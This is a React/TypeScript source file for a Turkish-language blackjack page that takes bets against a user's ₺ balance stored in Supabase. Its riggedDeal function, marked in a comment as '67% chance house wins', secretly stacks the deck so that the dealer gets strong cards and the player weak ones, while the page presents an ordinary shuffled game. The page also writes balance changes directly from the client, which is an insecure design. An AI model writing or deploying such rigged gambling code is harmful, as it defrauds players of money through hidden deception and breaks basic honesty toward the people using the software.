import { useState, useEffect, useCallback } from "react";
import { useAuth } from "@/hooks/useAuth";
import { supabase } from "@/integrations/supabase/client";
import { useQuery, useQueryClient } from "@tanstack/react-query";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { Button } from "@/components/ui/button";
import { toast } from "@/hooks/use-toast";
import { ArrowLeft } from "lucide-react";
import { Link } from "react-router-dom";

type Suit = "♠" | "♥" | "♦" | "♣";
type Rank = "A" | "2" | "3" | "4" | "5" | "6" | "7" | "8" | "9" | "10" | "J" | "Q" | "K";
interface Card { suit: Suit; rank: Rank; }

const SUITS: Suit[] = ["♠", "♥", "♦", "♣"];
const RANKS: Rank[] = ["A", "2", "3", "4", "5", "6", "7", "8", "9", "10", "J", "Q", "K"];

function createDeck(): Card[] {
  const deck: Card[] = [];
  for (const suit of SUITS) for (const rank of RANKS) deck.push({ suit, rank });
  return deck;
}

function shuffleDeck(deck: Card[]): Card[] {
  const d = [...deck];
  for (let i = d.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [d[i], d[j]] = [d[j], d[i]];
  }
  return d;
}

function cardValue(card: Card): number {
  if (["J", "Q", "K"].includes(card.rank)) return 10;
  if (card.rank === "A") return 11;
  return parseInt(card.rank);
}

function handValue(hand: Card[]): number {
  let total = hand.reduce((s, c) => s + cardValue(c), 0);
  let aces = hand.filter(c => c.rank === "A").length;
  while (total > 21 && aces > 0) { total -= 10; aces--; }
  return total;
}

function isBlackjack(hand: Card[]): boolean {
  return hand.length === 2 && handValue(hand) === 21;
}

// Rigged dealing: 67% chance house wins
function riggedDeal(deck: Card[]): { playerHand: Card[]; dealerHand: Card[]; remainingDeck: Card[] } {
  const d = [...deck];
  const houseWins = Math.random() < 0.67;

  if (houseWins) {
    // Give dealer a strong start (face card + high), player a weaker start
    const dealerCard1 = d.find(c => ["10", "J", "Q", "K"].includes(c.rank))!;
    d.splice(d.indexOf(dealerCard1), 1);
    const dealerCard2 = d.find(c => ["7", "8", "9", "10", "J", "Q", "K", "A"].includes(c.rank))!;
    d.splice(d.indexOf(dealerCard2), 1);
    // Player gets mediocre cards
    const playerCard1 = d.find(c => ["4", "5", "6", "7", "8"].includes(c.rank))!;
    d.splice(d.indexOf(playerCard1), 1);
    const playerCard2 = d.find(c => ["2", "3", "4", "5", "6", "7"].includes(c.rank))!;
    d.splice(d.indexOf(playerCard2), 1);
    return { playerHand: [playerCard1, playerCard2], dealerHand: [dealerCard1, dealerCard2], remainingDeck: d };
  } else {
    // Fair deal - player gets decent cards
    const playerCard1 = d.find(c => ["10", "J", "Q", "K"].includes(c.rank))!;
    d.splice(d.indexOf(playerCard1), 1);
    const playerCard2 = d.find(c => ["9", "10", "J", "Q", "K", "A"].includes(c.rank))!;
    d.splice(d.indexOf(playerCard2), 1);
    const dealerCard1 = d.find(c => ["3", "4", "5", "6"].includes(c.rank))!;
    d.splice(d.indexOf(dealerCard1), 1);
    const dealerCard2 = d.find(c => ["2", "3", "4", "5", "6"].includes(c.rank))!;
    d.splice(d.indexOf(dealerCard2), 1);
    return { playerHand: [playerCard1, playerCard2], dealerHand: [dealerCard1, dealerCard2], remainingDeck: d };
  }
}

type GameState = "betting" | "playing" | "dealer-turn" | "finished";

const BET_AMOUNTS = [10, 25, 50, 100, 250, 500];

const CardDisplay = ({ card, hidden = false }: { card: Card; hidden?: boolean }) => {
  const isRed = card.suit === "♥" || card.suit === "♦";
  if (hidden) {
    return (
      <div className="w-16 h-24 sm:w-20 sm:h-28 rounded-lg bg-gradient-to-br from-primary to-accent border-2 border-border flex items-center justify-center shadow-lg">
        <span className="text-2xl text-primary-foreground font-bold">?</span>
      </div>
    );
  }
  return (
    <div className={`w-16 h-24 sm:w-20 sm:h-28 rounded-lg bg-foreground border-2 border-border flex flex-col items-center justify-center shadow-lg transition-all duration-300`}>
      <span className={`text-lg sm:text-xl font-bold ${isRed ? "text-destructive" : "text-background"}`}>{card.rank}</span>
      <span className={`text-xl sm:text-2xl ${isRed ? "text-destructive" : "text-background"}`}>{card.suit}</span>
    </div>
  );
};

const Blackjack = () => {
  const { user } = useAuth();
  const queryClient = useQueryClient();
  const [gameState, setGameState] = useState<GameState>("betting");
  const [deck, setDeck] = useState<Card[]>([]);
  const [playerHand, setPlayerHand] = useState<Card[]>([]);
  const [dealerHand, setDealerHand] = useState<Card[]>([]);
  const [bet, setBet] = useState(0);
  const [result, setResult] = useState<string>("");
  const [winAmount, setWinAmount] = useState(0);
  const [processing, setProcessing] = useState(false);

  const { data: profile } = useQuery({
    queryKey: ["user-profile-bj", user?.id],
    queryFn: async () => {
      const { data } = await supabase.from("profiles").select("balance, display_name").eq("id", user!.id).maybeSingle();
      return data;
    },
    enabled: !!user,
    refetchInterval: 5000,
  });

  const balance = profile?.balance ?? 0;

  const startGame = useCallback(async (betAmount: number) => {
    if (!user || betAmount > balance) {
      toast({ title: "Yetersiz bakiye", variant: "destructive" });
      return;
    }
    setProcessing(true);
    // Deduct bet
    const { error } = await supabase.from("profiles").update({ balance: balance - betAmount }).eq("id", user.id);
    if (error) { toast({ title: "Hata", description: error.message, variant: "destructive" }); setProcessing(false); return; }
    await supabase.from("transactions").insert({ user_id: user.id, amount: -betAmount, type: "blackjack", description: "Blackjack bahis" });
    queryClient.invalidateQueries({ queryKey: ["user-profile-bj"] });
    queryClient.invalidateQueries({ queryKey: ["user-profile"] });

    const newDeck = shuffleDeck(createDeck());
    const { playerHand: ph, dealerHand: dh, remainingDeck } = riggedDeal(newDeck);
    setDeck(remainingDeck);
    setPlayerHand(ph);
    setDealerHand(dh);
    setBet(betAmount);
    setResult("");
    setWinAmount(0);
    setProcessing(false);

    // Check instant blackjack
    if (isBlackjack(ph)) {
      setGameState("finished");
      const win = Math.floor(betAmount * 2.5);
      setWinAmount(win);
      setResult("BLACKJACK! 🎉");
      await supabase.from("profiles").update({ balance: balance - betAmount + win }).eq("id", user.id);
      await supabase.from("transactions").insert({ user_id: user.id, amount: win, type: "blackjack_win", description: "Blackjack kazanç" });
      queryClient.invalidateQueries({ queryKey: ["user-profile-bj"] });
      queryClient.invalidateQueries({ queryKey: ["user-profile"] });
    } else {
      setGameState("playing");
    }
  }, [user, balance, queryClient]);

  const hit = () => {
    const newDeck = [...deck];
    const card = newDeck.pop()!;
    const newHand = [...playerHand, card];
    setPlayerHand(newHand);
    setDeck(newDeck);
    if (handValue(newHand) > 21) {
      setGameState("finished");
      setResult("BUST! Kaybettiniz 💥");
    }
  };

  const stand = () => {
    setGameState("dealer-turn");
  };

  const doubleDown = async () => {
    if (!user || bet > balance) {
      toast({ title: "Yetersiz bakiye", variant: "destructive" });
      return;
    }
    // Deduct extra bet
    await supabase.from("profiles").update({ balance: balance - bet }).eq("id", user.id);
    await supabase.from("transactions").insert({ user_id: user.id, amount: -bet, type: "blackjack", description: "Blackjack double down" });
    queryClient.invalidateQueries({ queryKey: ["user-profile-bj"] });
    queryClient.invalidateQueries({ queryKey: ["user-profile"] });
    setBet(bet * 2);
    const newDeck = [...deck];
    const card = newDeck.pop()!;
    const newHand = [...playerHand, card];
    setPlayerHand(newHand);
    setDeck(newDeck);
    if (handValue(newHand) > 21) {
      setGameState("finished");
      setResult("BUST! Kaybettiniz 💥");
    } else {
      setGameState("dealer-turn");
    }
  };

  // Dealer plays
  useEffect(() => {
    if (gameState !== "dealer-turn") return;
    const playDealer = async () => {
      let currentDeck = [...deck];
      let currentDealerHand = [...dealerHand];
      const delay = (ms: number) => new Promise(r => setTimeout(r, ms));

      while (handValue(currentDealerHand) < 17) {
        await delay(600);
        const card = currentDeck.pop()!;
        currentDealerHand = [...currentDealerHand, card];
        setDealerHand([...currentDealerHand]);
        setDeck([...currentDeck]);
      }

      await delay(400);
      const pv = handValue(playerHand);
      const dv = handValue(currentDealerHand);

      if (dv > 21) {
        const win = bet * 2;
        setWinAmount(win);
        setResult("Kasa battı! Kazandınız! 🎉");
        await supabase.from("profiles").update({ balance: (profile?.balance ?? 0) + win }).eq("id", user!.id);
        await supabase.from("transactions").insert({ user_id: user!.id, amount: win, type: "blackjack_win", description: "Blackjack kazanç" });
      } else if (dv > pv) {
        setResult("Kaybettiniz 😞");
      } else if (pv > dv) {
        const win = bet * 2;
        setWinAmount(win);
        setResult("Kazandınız! 🎉");
        await supabase.from("profiles").update({ balance: (profile?.balance ?? 0) + win }).eq("id", user!.id);
        await supabase.from("transactions").insert({ user_id: user!.id, amount: win, type: "blackjack_win", description: "Blackjack kazanç" });
      } else {
        const win = bet;
        setWinAmount(win);
        setResult("Berabere - Bahis iade 🤝");
        await supabase.from("profiles").update({ balance: (profile?.balance ?? 0) + win }).eq("id", user!.id);
        await supabase.from("transactions").insert({ user_id: user!.id, amount: win, type: "blackjack_refund", description: "Blackjack iade" });
      }
      queryClient.invalidateQueries({ queryKey: ["user-profile-bj"] });
      queryClient.invalidateQueries({ queryKey: ["user-profile"] });
      setGameState("finished");
    };
    playDealer();
  }, [gameState]);

  if (!user) {
    return (
      <div className="min-h-screen bg-background">
        <Header />
        <div className="flex items-center justify-center min-h-[60vh]">
          <div className="text-center space-y-4">
            <h2 className="text-2xl font-bold text-foreground">Blackjack</h2>
            <p className="text-muted-foreground">Oynamak için giriş yapmalısınız.</p>
          </div>
        </div>
        <Footer />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background">
      <Header />
      <div className="max-w-2xl mx-auto px-4 pt-6 pb-24">
        <div className="flex items-center gap-3 mb-6">
          <Link to="/" className="text-muted-foreground hover:text-foreground transition-colors">
            <ArrowLeft className="h-5 w-5" />
          </Link>
          <h1 className="text-2xl font-bold text-foreground font-rajdhani">♠ Blackjack</h1>
          <div className="ml-auto bg-secondary px-3 py-1 rounded-lg">
            <span className="text-sm text-muted-foreground">Bakiye: </span>
            <span className="text-sm font-bold text-accent">₺{balance.toFixed(2)}</span>
          </div>
        </div>

        {/* Game Table */}
        <div className="bg-gradient-to-b from-[hsl(var(--secondary))] to-[hsl(var(--card))] rounded-2xl border border-border p-4 sm:p-6 min-h-[400px] flex flex-col">
          {/* Dealer Section */}
          <div className="mb-6">
            <div className="flex items-center gap-2 mb-2">
              <span className="text-xs font-semibold text-muted-foreground uppercase tracking-wider">Kasa</span>
              {(gameState === "dealer-turn" || gameState === "finished") && dealerHand.length > 0 && (
                <span className="text-xs font-bold text-accent bg-accent/10 px-2 py-0.5 rounded">{handValue(dealerHand)}</span>
              )}
            </div>
            <div className="flex gap-2 flex-wrap">
              {dealerHand.map((card, i) => (
                <CardDisplay key={i} card={card} hidden={i === 1 && gameState === "playing"} />
              ))}
              {dealerHand.length === 0 && <div className="h-24 sm:h-28 flex items-center"><span className="text-muted-foreground text-sm">Bahis yaparak başlayın</span></div>}
            </div>
          </div>

          {/* Result */}
          {gameState === "finished" && (
            <div className="text-center py-4 space-y-1">
              <p className={`text-xl font-bold ${result.includes("Kazandınız") || result.includes("BLACKJACK") ? "text-accent" : result.includes("Berabere") ? "text-muted-foreground" : "text-destructive"}`}>
                {result}
              </p>
              {winAmount > 0 && <p className="text-sm text-accent">+₺{winAmount.toFixed(2)}</p>}
            </div>
          )}

          {/* Spacer */}
          <div className="flex-1" />

          {/* Player Section */}
          <div className="mt-6">
            <div className="flex items-center gap-2 mb-2">
              <span className="text-xs font-semibold text-muted-foreground uppercase tracking-wider">Siz</span>
              {playerHand.length > 0 && (
                <span className="text-xs font-bold text-accent bg-accent/10 px-2 py-0.5 rounded">{handValue(playerHand)}</span>
              )}
              {bet > 0 && <span className="text-xs text-muted-foreground ml-auto">Bahis: ₺{bet}</span>}
            </div>
            <div className="flex gap-2 flex-wrap">
              {playerHand.map((card, i) => (
                <CardDisplay key={i} card={card} />
              ))}
            </div>
          </div>
        </div>

        {/* Controls */}
        <div className="mt-4 space-y-3">
          {gameState === "betting" && (
            <div>
              <p className="text-sm text-muted-foreground mb-2 text-center">Bahis miktarını seçin</p>
              <div className="grid grid-cols-3 gap-2">
                {BET_AMOUNTS.map(amount => (
                  <Button
                    key={amount}
                    onClick={() => startGame(amount)}
                    disabled={amount > balance || processing}
                    variant={amount > balance ? "outline" : "default"}
                    className="h-12 text-base font-bold"
                  >
                    ₺{amount}
                  </Button>
                ))}
              </div>
            </div>
          )}

          {gameState === "playing" && (
            <div className="flex gap-2">
              <Button onClick={hit} className="flex-1 h-12 text-base font-bold">Kart Çek</Button>
              <Button onClick={stand} variant="secondary" className="flex-1 h-12 text-base font-bold">Dur</Button>
              {playerHand.length === 2 && bet <= balance && (
                <Button onClick={doubleDown} variant="outline" className="flex-1 h-12 text-base font-bold border-accent text-accent">2x</Button>
              )}
            </div>
          )}

          {gameState === "dealer-turn" && (
            <p className="text-center text-muted-foreground animate-pulse">Kasa oynuyor...</p>
          )}

          {gameState === "finished" && (
            <Button onClick={() => { setGameState("betting"); setPlayerHand([]); setDealerHand([]); setBet(0); }} className="w-full h-12 text-base font-bold">
              Tekrar Oyna
            </Button>
          )}
        </div>
      </div>
      <Footer />
    </div>
  );
};

export default Blackjack;
